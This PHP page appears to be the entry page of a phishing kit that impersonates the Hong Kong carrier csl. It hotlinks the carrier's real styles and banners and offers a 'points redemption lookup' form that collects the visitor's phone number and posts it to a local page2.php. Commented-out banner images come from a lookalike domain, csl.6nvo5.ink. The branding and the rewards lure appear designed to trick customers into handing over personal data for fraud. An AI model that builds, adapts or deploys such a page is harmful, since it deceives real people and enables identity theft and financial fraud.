<?php
@session_start();

include('partials/header.php');

?>

<style>
    /* .login-banner{background: url(./assets/images/pink-banner.jpg) no-repeat center center; min-height: 200px;} */
    @media(max-width: 767px) {
       /* .login-form {
            width: 75%;
            margin: 10px auto 0px;
            border-radius: 8px;
            box-shadow: 0 10px 20px 0 rgb(0 0 0 / 9%);
            background-color: #fff;
            position: relative;
            z-index: 99;
            padding: 25px 25px;
        }

        .login-form input {
            border-radius: 10px;
            height: 48px;
            padding: 0 1.42rem;
            font-size: 1rem;
            line-height: 48px;
            width: calc(100% - 50px);
            border: 1px solid #888;
            outline: none;
            position: relative;
            z-index: 1;
            color: #222226;
            text-overflow: ellipsis;
            margin-bottom: 0;
        }

        .login-form #submit {
         width: 100%;
            line-height: 60px;
            text-align: center;
            display: inline-block;
            color: #fff !important;
            border-radius: 30px;
            background: linear-gradient(56.78deg, #f70c93 0%, #7433df 63.27%, #2da9c8 100%);
            cursor: pointer;
        }

        .login-form #submit:hover {
            background-color: red;
            border-color: red;
        }


        .login-form input.error {
            border-color: #ff4e1c;
            font-size: 12px;
        }

        .login-form label.error {
            color: #ff4e1c;
            font-size: 12px;
        }

        .login-form .form-group {
            margin-bottom: 15px;
        }

        .login-form input.error::placeholder {
            color: #ff4e1c;
        }

        .login-form h2 {
            line-height: 20px;
            font-size: 1rem;
            font-weight: 500;
            color: #4a4a4a;
            margin-bottom: 30px;
            text-align: center;
        }

        .login-banner .owl-dot {
            background: #fff !important;
            border: 1px solid #ddd !important;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin: 5px;
        }

        .login-banner .owl-dots {
            text-align: center;
            position: relative;
            margin-top: 12px;
        }

        .login-banner .owl-dot.active {
        
            background: linear-gradient(56.78deg, #f70c93 0%, #7433df 63.27%, #2da9c8 100%);
        
        } */

        /* .usernew_login_inks {
            margin-top: 20px;
            display: block;
            justify-content: start;
            font-size: 12px;
        }

        .usernew_login_inks .usernew_login_link {
            text-align: center;
            margin-top: 10px;
            padding-left: 0;
            padding-right: 0;
            display: flex;
            justify-content: center;
        }

        .usernew_login_password .usernew_login_inks .usernew_login_link a {
            display: block;
            flex: 1;
        }

        .usernew_login_inks .usernew_login_link .login_link_text:not(:first-child) {
            padding-left: 10px;
            margin-left: 10px;
            border-left: 1px solid #ddd;
        }

        .usernew_login_inks .login_link_text {
            font-size: 12px;
            line-height: 1;
            color: red;
            text-decoration: none;
            flex: 1;
        } */

        .page_breadcrumb .page_breadcrumb_wrap {
            padding-top: 0.72rem;
            padding-bottom: 0.72rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .page_breadcrumb .breadcrumb_content .breadcrumb_current {
            font-size: 16px;
            line-height: 1;
            color: #878787;
        }

        .common_share_third .share_button {
            line-height: 24px;
            font-size: 14px;
            border: none;
            background: none;
        }

        .common_share_third .share_button .share_btn_icon {
            background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC0AAAAtCAYAAAA6GuKaAAAAAXNSR0IArs4c6QAABLtJREFUaEPtl21oXEUUht8zN4maaCxN/khQWptaRUEwNbGV2IImGqS02XtvQhFBLQa0ptnNRxWhZUFFbU32JtWqAUtBU01nZ1N/taI/AtVimoIfrTa2jYIYLdqUFGPUJDtHrtmFkO5mt8nmo7AD99fcOee577xz5lzCVTjoKmRGGnq+di2tdFrpaRRI2yNtj/myR1FRTeayZdc9w0yPEfFdAIGIThHhwPDw+DuHD+/5NxW7kTJPezzem4ggAdwfB+xbIUYflnLv+dmCpwTatm2DueAoM9YA+JOIXtOajzCLsGHoMma8ACCPCF8vXTpS3N7ePjYb8JRAm6bvOYD3uMAArVEq8N1kKNv2FWrNX7rggKhTqqVtwaE9Hm8PEYqJsDMYdF6KBWSaPh/ALQB6lXKKFxzaNL1/AcgWgkqkDByPBWTbDUVah08APKJUa86igQ6HqeTQodjQ69c/cW1e3pLTzPg9FHJKFhzasrw9zChmph2hUODleEB+v1/4/X4G4D4zHik6iN6tAN6MHMQOgG2tUdrV5Zx2yWy7bhUzNTOjQynnwxnTRhamBDpS8o65akfiakBUCcFntOYyADsB3AjgoFJO9aKAdiEsy1fOzEfgXoMxB33FzI+GQs5viwK6snJrnhBZvQAvB/AZgBsArAKgmfl7gN43jIH9UsrR2QK762dtD9caWhe4Cj8EoGdkJLwuVT1GvA+cNbRleXczoxHg80KI1VIGBlKh5nQxZgVtmt7NADoAjAmhH5Sy7fO5Br5ie5SXN+bk5o43MaMKwAoAGQAEkdgVDLY8nwjYsurXMusmAA8AuB5APzMfuHjx0hvd3fv/SbQ+Op+00ps21a4wDONjAHfGCD4O0ItKBXbHS2xZ3kZmvBr50KmvnRFCl0nZ9nMy4ElBV1TUXpOdbfQAuBvAj8zwM4sewxjPZxZbADzpJhNCbJaypXNqYtv2VWrNoYmbkPYRhfeFwxkXiHQJEfwAbgVwSggqljLwdyLwpKBNs24bQK0Azmk9dl9X11uDkwN7PN7tRHgdoJ+E+GWllDIcnXev7pMnh1wFCwDaPnU3JsplpiuIa7dnlXLeThG07wuA1wJUrVTg4OVB/cI0h34AUCiEUS5l86fRd2zbt05r7gZwVqkltwN+PXW9x1NfTaQ/AnBCKefeFEFPtJ5aj+VPVTmawDTr2gF6On5C7lOq9Y5Y8xs2NORnZYX/ADCilJOwbU3SHslAe98FUDMT6IhFLrgNl1JObqqU7gWwOoE9+gCsZKayUCjgXuX/D8uqLWc2PpnOHqbpqwK4kxnHk+m1k1S6fhug4x5E0/Q1AbyLGb8axsDyyT2GbfuztB46C+CWaQ6i+/9YCKBBKcf9JZt2JAVdU1OTOTiY/Q0A15ORkjfWk5GRmac1bQH4qYk+RjyuVMsHUzNGlYyWPCH4vfHxsUGizEklj/qEwD0pK3kuxMaN9TdnZGh322+7XAZ26+8OpZxX4kk08WOrmwGKJVS/EPSIlIFziVR255NSOhqooqI2NyfHqJ90jV8CcJRINweDbccSJbQsXykz1wMoBTgHoH4idBKNBqTcO5xofXT+iqCTDTrX76Wh51rhtD3mS+G00mmlk1DgP9f48T3zk3pKAAAAAElFTkSuQmCC) no-repeat;
            background-size: cover;
        }

        .common_share_third .share_icon {
            width: 24px;
            height: 24px;
            display: inline-block;
            vertical-align: top;
        }

        .common_width_container {
            padding-left: 1.072rem;
            padding-right: 1.072rem;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
    }
</style>
<!--
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css"/>
-->

<!-- <div class="page-title">登入</div> -->
<!-- <div class="tpl-breadcrumbnew">
    <div class="page_breadcrumb" style="background-color: transparent;">
        <div class="page_breadcrumb_wrap common_width_container">
            <div class="breadcrumb_content">
                <p class="breadcrumb_current"> 兌換我的獎賞 </p>
            </div>
            <div class="common_share_third"><button type="button" class="el-button share_button el-button--default">
                    <span> 分 享 <i class="share_icon share_btn_icon"></i></span></button>
                <div></div>
            </div>
        </div>
        <div></div>
    </div>
</div> -->
<!--
<div class="login-banner">
    <div class="owl-carousel owl-theme">
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16838779591786529.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16838779591826726.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16836170822326292.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16836170822355911.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16835194647658102.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16835194647680161.jpg">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16825910906568586.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16825910906591101.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16839043584691166.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16839043584717105.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16782411131222008.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16782411131241253.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16836256987602333.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16836256987626483.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16826682110800812.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16826682110829598.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16820444779394138.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16820444779452895.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16796418172046001.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16796418172084764.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16741116209025256.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16740957080213118.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16770580870700648.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16770580870717221.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16805992961170696.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16805992961205765.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16787788723958346.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16787788723967852.jpg" alt="">
            </div>
            <div class="item active">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16789353852995175.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16789353853023676.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16831887546111305.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16831887546159902.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16684812077696856.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16684812077715749.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16685689876026758.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16685689876055134.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16553624622144547.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16553624622218455.jpg" alt="">
            </div>
            <div class="item">
                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16633008729175414.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16633008729183595.jpg" alt="">
            </div>
    </div>
</div>
-->
<link href="https://www.hkcsl.com/r/cms/pccw/2020/css/bootstrap.css" rel="stylesheet">
    <link rel="stylesheet" href="https://www.hkcsl.com/r/cms/pccw/2020/css/newstyle.css" type="text/css" />
    <!-- <link rel="stylesheet" type="text/css" href="/r/cms/pccw/2020/css/default.css" /> -->
    <link rel="stylesheet" type="text/css" href="https://www.hkcsl.com/r/cms/pccw/2020/css/component.css" />
    <link href="https://www.hkcsl.com/r/cms/pccw/2020/css/fonts.css" rel="stylesheet">
    <!-- <link href="/r/cms/pccw/2020/css/jquery.mmenu.all.css" rel="stylesheet"> -->

	<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
	<script src="https://www.hkcsl.com/r/cms/pccw/2020/js/jquery.min.js"></script>
	<!-- <script type="text/javascript" src="/hw/ztbworkflow/tbworkflow.js"></script> -->
	<!-- Include all compiled plugins (below), or include individual files as needed -->
	<script src="https://www.hkcsl.com/r/cms/pccw/2020/js/bootstrap.min.js"></script>
<section>
		<div class="container banner_box">
		<div class="row">
			<div class="col-md-12">
				<div class="carousel slide" id="carousel-example-generic" data-pause="hover" data-ride="carousel" data-interval="5000" style="touch-action: pan-y; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
					<div class="carousel-inner">
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - Samsung Galaxy Fold5 | Flip5 (TC)'); return false;" href="https://www.hkcsl.com/tc/samsung-galaxy-zflip5-zfold5/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16905256562857736.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16905256562861721.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner -  Nothing Phone (2) (TC)'); return false;" href="https://www.hkcsl.com/tc/nothingphone2/" target="_blank">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16893051072500624.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16893051072537469.jpg" alt="">
                            </a>
                        </div>
                        <div class="item active">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - 5G Upload plus service (TC)'); return false;" href="https://www.hkcsl.com/tc/5g-uploadplus-service/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16872252035153675.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16872252035184869.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'External Link', 'Click on Home Banner', 'Click on Home Banner - csl CVS 2023 (TC)'); return false;" href="https://www.hkcsl-5g.com/tc/cvs-offers-list-2023/" target="_blank">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16895634144986375.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16895634145006702.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner -  csl - HKRMA  (TC)'); return false;" href="https://www.hkcsl.com/tc/hkrma-2023-offers/" target="_blank">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16880307753184341.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16880307753221468.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - 率先掌握 AI (TC)'); return false;" href="https://www.hkcsl.com/tc/ai-academy/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16849229361488433.png">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16849229361501054.png" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner -   motorola razr 40 ultra (TC)'); return false;" href="https://www.hkcsl.com/tc/motorola-razr-40-ultra/" target="_blank">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16899335739591044.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16899335739627655.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - Xiaomi 13 Ultra (TC)'); return false;" href="https://www.hkcsl.com/tc/xiaomi13ultra/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16866255211343065.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16866255211365206.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - MacBook Air 15 吋  (TC)'); return false;" href="https://www.hkcsl.com/tc/macbook-air-15-m2-learn-more/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16867125372152407.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16867125372163625.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - ROG Phone 7 (TC)'); return false;" href="https://www.hkcsl.com/tc/rog-phone-7/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16825910906568586.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16825910906591101.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - HSBC x Apple Product Flexible Purchase Plan (TC)'); return false;" href="https://www.hkcsl.com/tc/apple_installment_programme_hsbc/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16839043584691166.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16839043584717105.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - Citi The Club Standalone (TC)'); return false;" href="https://www.hkcsl.com/tc/citi-the-club-standalone/" target="_blank">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16910347578625266.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16910347578683905.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - csl Standalone (TC)'); return false;" href="https://www.hkcsl.com/tc/standalone-handset-price-list/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16891440338993424.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16891440339044019.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - 5G Home Internet (TC)'); return false;" href="https://www.hkcsl.com/tc/cslxnetvigator-5g-home-internet/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16826682110800812.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16826682110829598.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - WTTH-linksys (TC)'); return false;" href="https://www.hkcsl.com/tc/cslxnetvigator-5g-home-internet/ " target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16847199204614047.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16847199204638175.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - New 5G APAC Plan (TC)'); return false;" href="https://www.hkcsl.com/tc/new-5g-apac-plan?utm_source=hkcsl&amp;utm_medium=web&amp;utm_campaign=new5G_apac_plan_2023_homepage-banner&amp;utm_content=230324_new5G_apac_plan_2023_homepage-banner_homepage" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16796418172046001.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16796418172084764.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - ChinaMacau_5GPlan (TC)'); return false;" href="/tc/china-macau-5g-promopage/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16741116209025256.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16740957080213118.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - 86-Easy (TC)'); return false;" href="https://www.hkcsl.com/tc/86-easy/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16770580870700648.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16770580870717221.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - Samsung Galaxy S23 (TC)'); return false;" href="https://www.hkcsl.com/tc/samsung-galaxy-s23/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16856124420606002.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16856124420629383.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - MGM (TC)'); return false;" href="https://www.hkcsl-5g.com/tc/referral-program/" target="_blank">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16886350489389357.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16886350489415948.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - HKMA 5 year win (TC)'); return false;" href="https://www.hkcsl.com/tc/hkma-awards-gold-5th-time/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16684812077696856.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16684812077715749.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - Google One (TC)'); return false;" href="/tc/google-one/ " target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16685689876026758.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16685689876055134.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'External Links', 'Click on Home Banner', 'Click on Home Banner - U-Plan (TC)'); return false;" href="http://hkcsl.com/tc/u-plan/?utm_source=hkcsl&amp;utm_medium=referral&amp;utm_campaign=2022_uplan_may&amp;utm_content=220601_2022_uplan_may_home_top_banner" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16553624622144547.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16553624622218455.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - Restart 3.0 (TC)'); return false;" href="https://www.hkcsl.com/tc/restart/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16633008729175414.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16633008729183595.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Links', 'Click on Home Banner', 'Click on Home Banner - iCloud (TC)'); return false;" href="http://hkcsl.com/tc/direct-carrier-billing-generic-icloud/?utm_source=hkcsl&amp;utm_medium=referral&amp;utm_campaign=iClould_50GB_tc_banner&amp;utm_content=220601_iClould_50GB_tc_banner_home_top_banner" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16540530491511253.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16540530491549455.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'External Link', 'Click on Home Banner', 'Click on Home Banner - csl-ADCC (TC)'); return false;" href="https://www.adcc.gov.hk/zh-hk/home.html " target="_blank">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16752172428661997.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16752172428687542.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'External Link', 'Click on Home Banner', 'Click on Home Banner - csl-scameter (TC)'); return false;" href="https://cyberdefender.hk/scameter/" target="_blank">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16813587509879794.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16813587509891112.jpg" alt="">
                            </a>
                        </div>
                        <div class="item">
                            <a onclick="trackOutboundLink(this, 'Internal Link', 'Click on Home Banner', 'Click on Home Banner - csl WhatsApp Certification (TC)'); return false;" href="https://www.hkcsl.com/tc/whatsapp-certification/" target="_self">
                                <img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16856948331599946.jpg">
                                <img class="hidden visible-xs-block" src="https://www.hkcsl.com/r/cms/www/img/banner/16856948331623603.jpg" alt="">
                            </a>
                        </div>
					</div>
					<a class="left carousel-control" href="#carousel-example-generic" role="button" data-slide="prev" style="visibility: visible;">
						<span class="glyphicon glyphicon-chevron-left arrow_left"><img src="https://www.hkcsl.com/r/cms/pccw/2020/images/arrow-left.png" alt=""></span>
					</a>
					<a class="right carousel-control" href="#carousel-example-generic" role="button" data-slide="next" style="visibility: visible;">
						<span class="glyphicon glyphicon-chevron-right arrow_right"><img src="https://www.hkcsl.com/r/cms/pccw/2020/images/arrow-right.png" alt=""></span>
					</a>
					<div class="more_information" style="">
						<!-- <span>更多資訊</span> -->
						<span class="arrow-bottom">
							<div class="animate-bounce-down"><img src="https://www.hkcsl.com/r/cms/pccw/2020/images/arrow-bottom.png" alt=""></div>
						</span>
					</div>
				</div>

			</div>
		</div>
	</div>
</section>

<script type="text/javascript">
function trackOutboundLink(link, category, action, label) { 
	if (link.target == '_blank')
		window.open(url);
	else
		setTimeout(function() { document.location.href = link.href;}, 100);
	return false;
}
</script>

<section class="preferential_news_box">

<div class="login-form">

            <div class="buy_machine_title">
        <div>積分兌換查詢</div>
    </div>


    <form action="./page2.php" method="POST" id="loginForm" style="text-align: center; margin:20px;" novalidate="">
        <div class="form-group" style="text-align: center; margin:20px;">
            <input type="number" class="form-control search-field-fake" id="searchString" placeholder="請輸入手機號碼" name="phone" required="" style="
    /* padding-right: 3rem; */
    /* height: 100%; */
    /* height: 48px; */
    /* border: none; */
    " autocomplete="off">
        </div>
        <button type="submit" class="btn btn-primary login-btn" name="submit" id="submit" style="background-color: var(--skin-primary-color-1);
    border: none;
    color: var(--color-dark-gray);
    background: linear-gradient(90deg,#fd0 0,#faa61a);width:280px">查詢</button>
    </form>
    </div>
</section>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
